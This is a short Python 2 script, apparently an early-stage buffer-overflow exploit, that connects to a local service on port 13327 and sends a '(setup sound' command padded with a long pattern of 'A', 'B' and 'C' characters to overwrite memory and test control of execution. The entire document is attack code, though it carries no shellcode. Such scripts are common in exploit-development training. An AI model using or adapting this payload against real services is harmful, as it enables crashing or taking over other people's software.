#!/usr/bin/python
import socket


host= "127.0.0.1"

patter = "A" *4368 + "B"*4 + "C"*7


buffer = "\x11(setup sound " + patter + "\x90\x00#"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "[*]Sending..."
s.connect((host, 13327))
data=s.recv(1024)
s.send(buffer)
print data
s.close()

print "[*]Payload Sent !"
